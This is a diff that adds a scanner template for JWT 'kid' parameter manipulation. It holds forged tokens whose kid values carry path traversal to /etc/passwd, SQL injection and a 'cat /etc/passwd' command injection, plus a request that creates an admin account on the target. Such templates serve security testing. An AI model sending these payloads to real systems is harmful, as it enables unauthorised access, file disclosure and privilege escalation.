@@ -1,0 +1,114 @@
+id: medium-api-json-web-token-kid-manipulation
+
+info:
+  name: JWT Kid Parameter Manipulation
+  author: redteam-elite
+  severity: medium
+  description: |
+    Detects JWT implementations vulnerable to kid (Key ID) parameter manipulation
+    attacks including path traversal, SQL injection, command injection, and
+    arbitrary file inclusion through the kid header parameter.
+  reference:
+    - https://tools.ietf.org/html/rfc7515#section-4.1.4
+    - https://portswigger.net/web-security/jwt/working-with-jwts-in-burp-suite
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
+    cvss-score: 8.6
+    cwe-id: CWE-22
+  tags: jwt,kid,manipulation,path-traversal,injection,api,medium
+
+http:
+  - raw:
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"username":"user","password":"password"}
+
+      - |
+        GET /api/user/profile HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{jwt_path_traversal}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        GET /api/admin/users HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{jwt_sql_injection}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        GET /api/admin/settings HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{jwt_command_injection}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        POST /api/admin/users HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{jwt_file_inclusion}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"username":"kid_exploit_user","role":"admin"}
+
+    variables:
+      # JWT with path traversal in kid parameter
+      jwt_path_traversal: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNjE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.8B_mLfnrIQN7UbSqtY4cjjz2vUFOVUnG2EJcOt6arU0"
+      # JWT with SQL injection in kid parameter  
+      jwt_sql_injection: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IicgT1IgMT0xLS0ifQ.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNjE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.Hm0y2k1zKkUjz5FvFO2BSaEhF-rQxeJf4n8rjKvtMQs"
+      # JWT with command injection in kid parameter
+      jwt_command_injection: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjsgY2F0IC9ldGMvcGFzc3dkOyAjIn0.eyJzdWIiOiIxIiwibmFtZSI6InN1cGVyYWRtaW4iLCJpYXQiOjE2MTYyMzkwMjIsInJvbGUiOiJzdXBlcmFkbWluIn0.xvdHjCxU5_y8nQz7FvQqKjLmF2oE3rN9sP1wX6vY8Qk"
+      # JWT with file inclusion in kid parameter
+      jwt_file_inclusion: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNjE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ"
+
+    extractors:
+      - type: regex
+        name: original_jwt
+        group: 1
+        regex:
+          - '"token":\s*"([^"]+)"'
+          - '"access_token":\s*"([^"]+)"'
+        internal: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: regex
+        part: body
+        regex:
+          - '"id":\s*\d+'
+          - '"username":\s*"[^"]+"'
+          - '"role":\s*"admin"'
+          - '"role":\s*"superadmin"'
+          - '"users":\s*\['
+          - '"settings":\s*\{'
+          - '"username":\s*"kid_exploit_user"'
+          - 'root:.*:/bin/bash'
+          - 'daemon:.*:/bin/sh'
+        condition: or
+
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - '"error":\s*"invalid.*token"'
+          - '"error":\s*"kid.*validation.*failed"'
+          - '"error":\s*"key.*not.*found"'
+          - 'kid.*parameter.*invalid'
+          - 'path.*traversal.*detected'
+
+      - type: word
+        part: header
+        negative: true
+        words:
+          - "X-JWT-Kid-Validation: strict"
+          - "X-Path-Traversal-Protection: enabled"
+
+    stop-at-first-match: true
